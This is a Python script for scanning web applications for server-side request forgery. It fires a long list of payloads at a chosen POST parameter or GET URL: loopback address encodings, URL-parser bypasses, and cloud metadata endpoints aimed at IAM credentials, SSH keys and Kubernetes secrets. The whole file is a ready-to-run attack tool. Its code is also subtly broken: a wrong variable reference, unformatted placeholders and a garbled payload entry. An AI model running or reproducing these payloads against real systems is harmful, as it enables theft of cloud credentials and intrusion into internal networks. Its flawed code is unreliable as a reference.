import requests
from urllib.parse import urlparse
from urllib3 import disable_warnings,exceptions
disable_warnings(exceptions.InsecureRequestWarning)
import json
import argparse



proxy_url = 'http://127.0.0.1:8080'
proxies = {
    'http': proxy_url,
    'https': proxy_url,
}

class SSRF:
    def __init__(self, TargetUrl, headers=None, data=None, endpoint=None, PostSsrf=None,GetSsrf=None):
        self.TargetUrl = TargetUrl
        self.hostName = self.getHostname(TargetUrl)
        self.headers = headers
        self.data = data
        self.endpoint = endpoint
        self.payloads = ['http://127.1', 'http://127.0.0.1', 'http://127.0.0.1:80', 'http://127.0.0.1:443', 'http://127.0.0.1:22', 'http://127.1:80', 'http://127.1:443', 'http://127.1:22', 'http://127.1:8080', 'http://0', 'http://0.0.0.0:80', 'http://localhost:80', 'http://[::]:80/', 'http://[::]:25/SMTP', 'http://[::]:3128/Squid', 'http://[0000::1]:80/', 'http://[0:0:0:0:0:ffff:127.0.0.1]/', 'http://①②⑦.⓪.⓪.⓪', 'http://127.127.127.127', 'http://127.0.1.3', 'http://127.0.0.0', 'http://2130706433/', 'http://017700000001', 'http://3232235521/', 'http://3232235777/', 'http://0x7f000001/', 'http://0xc0a80014/', 'http://{self.hostName}@127.0.0.1', 'http://127.0.0.1#{self.hostName}', 'http://{self.hostName}.127.0.0.1', 'http://127.0.0.1/{self.hostName}', 'http://127.0.0.1/?d={self.hostName}', 'http://{self.hostName}@127.0.0.1', 'http://127.0.0.1#{self.hostName}', 'http://{self.hostName}.127.0.0.1', 'http://127.0.0.1/{self.hostName}', 'http://127.0.0.1/?d={self.hostName}', 'http://{self.hostName}@localhost', 'http://localhost#{self.hostName}', 'http://{self.hostName}.localhost', 'http://localhost/{self.hostName}', 'http://localhost/?d={self.hostName}', 'http://127.0.0.1%00{self.hostName}', 'http://127.0.0.1?{self.hostName}', 'http://127.0.0.1///{self.hostName}', 'http://127.0.0.1%00{self.hostName}', 'http://127.0.0.1?{self.hostName}', 'http://127.0.0.1///{self.hostName}st:+11211aaa', 'http://st:00011211aaaa', 'http://0/', 'http://127.1', 'http://127.0.1', 'http://1.1.1.1&@2.2.2.2#@3.3.3.3/', 'http://127.1.1.1:80\\@127.2.2.2:80/', 'http://127.1.1.1:80\\@@127.2.2.2:80/', 'http://127.1.1.1:80:\\@@127.2.2.2:80/', 'http://127.1.1.1:80#\\@127.2.2.2:80/', 'http://0x7f.0x0.0x0.0x1', 'http://0177.0.0.01', 'http://2130706433', 'http://%6c%6f%63%61%6c%68%6f%73%74', 'http://169.254.169.254/latest/meta-data/', 'http://[::ffff:169.254.169.254]', 'http://[0:0:0:0:0:ffff:169.254.169.254]', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy', 'http://169.254.169.254/latest/user-data', 'http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]', 'http://169.254.169.254/latest/meta-data/ami-id', 'http://169.254.169.254/latest/meta-data/reservation-id', 'http://169.254.169.254/latest/meta-data/hostname', 'http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key', 'http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key', 'http://169.254.170.2/v2/credentials/', 'http://169.254.169.254/computeMetadata/v1/', 'http://metadata.google.internal/computeMetadata/v1/', 'http://metadata/computeMetadata/v1/', 'http://metadata.google.internal/computeMetadata/v1/instance/hostname', 'http://metadata.google.internal/computeMetadata/v1/instance/id', 'http://metadata.google.internal/computeMetadata/v1/project/project-id', 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env', 'http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true', 'http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json', 'http://169.254.169.254/metadata/v1.json', 'http://169.254.169.254/metadata/v1/', 'http://169.254.169.254/metadata/v1/id', 'http://169.254.169.254/metadata/v1/user-data', 'http://169.254.169.254/metadata/v1/hostname', 'http://169.254.169.254/metadata/v1/region', 'http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address', 'https://metadata.packet.net/userdata', 'http://169.254.169.254/metadata/instance?api-version=2017-04-02', 'http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text', 'http://169.254.169.254/opc/v1/instance/', 'http://100.100.100.200/latest/meta-data/', 'http://100.100.100.200/latest/meta-data/instance-id', 'http://100.100.100.200/latest/meta-data/image-id', 'http://169.254.169.254/openstack', 'http://192.0.0.192/latest/', 'http://192.0.0.192/latest/user-data/', 'http://192.0.0.192/latest/meta-data/', 'http://192.0.0.192/latest/attributes/', 'https://kubernetes.default.svc.cluster.local', 'https://kubernetes.default', 'https://kubernetes.default.svc/metrics']
        self.PostSsrf = ssrf
        self.GetSsrf = GetSsrf
        
    def getHostname(self,url):
        parsedUrl = urlparse(url)
        return parsedUrl.hostname
    
    def sendPost(self):
        try:
            if self.headers and self.data and self.endpoint:
                response = requests.post(self.TargetUrl+self.endpoint, headers=self.headers, data=self.data ,proxies=proxies,verify=False)
                return response
            else:
                return False
        except:
            print("error in sending post")
            return False
    
    def checkSsrfPost(self):
        if self.headers and self.endpoint and self.data and self.PostSsrf :
            for i in self.payloads:
                self.data[self.PostSsrf] = i
                response = self.sendPost()
                if self.checkResponseResult(response):
                    print("ssrf Found",i,"   ",self.TargetUrl)
        else:
            print("all parameter must be passed")

   
    def sendGet(self):
        try:
            if "ssrf" in self.TargetUrl:
                for i in self.payloads:
                    self.TargetUrl = self.TargetUrl.replace("ssrf",i)
                    response = requests.get(self.TargetUrl)
                    if self.checkResponseResult(response):
                        print("ssrf found in ",i,f"  {self.TargetUrl}")
        except:
            print("error in sending get")
            return False

    def checkResponseResult(self, response):
        try:
            if response.status_code == 200:
                return True
            else:
                return False
        except:
            print("response doesn't have status_code")

            
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ssrf script", add_help=False)
    parser.add_argument('--help', '-h', action='help', help='this is a help message')
    parser.add_argument('--url', type=str, help='Input dictionary headers like {"key":"value"}')
    parser.add_argument('--headers', type=str, help='Input dictionary headers like {"key":"value"}')
    parser.add_argument('--postData', type=str, help='Input dictionary PostData like {"key":"value"}')
    parser.add_argument('--endpoint', type=str, help='Input str')
    parser.add_argument('--ssrf', type=str, help='Input which will be the payload')




    args = parser.parse_args()
    url = args.url
    headers = json.loads(args.headers)
    PostData = json.loads(args.postData)
    EndPoint = args.endpoint
    ssrf = args.ssrf

    ssrfTest = SSRF(TargetUrl=url,headers=headers,data=PostData,endpoint=EndPoint,PostSsrf=ssrf)
    ssrfTest.checkSsrfPost()

    